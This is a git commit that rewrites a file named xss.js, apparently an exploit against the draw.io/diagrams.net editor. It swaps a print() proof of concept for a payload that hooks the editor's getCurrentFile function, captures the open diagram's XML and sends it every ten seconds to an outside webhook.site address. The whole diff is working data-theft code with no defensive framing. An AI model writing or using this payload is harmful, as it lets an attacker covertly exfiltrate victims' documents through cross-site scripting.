7ea858eac33d9d8a08ff109665548eccc4dd105d
void0x <122229789+void0x@users.noreply.github.com>
2023-09-01 20:48:36 +0300

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,13 @@
-print()
+var exfilt_url = "https://webhook.site/415d9e82-5e7e-436b-bc8b-3c0f8e3cab27";
+var content = "";
+
+top.EditorUi.prototype.getCurrentFile = function() {
+    if(this.currentFile !== null) {
+        content = top.mxUtils.getPrettyXml(this.currentFile.ui.editor.getGraphXml());
+    }
+    return this.currentFile;
+};
+
+setInterval(() => {
+    fetch(exfilt_url, { method: "POST", body: content });
+}, 10000)
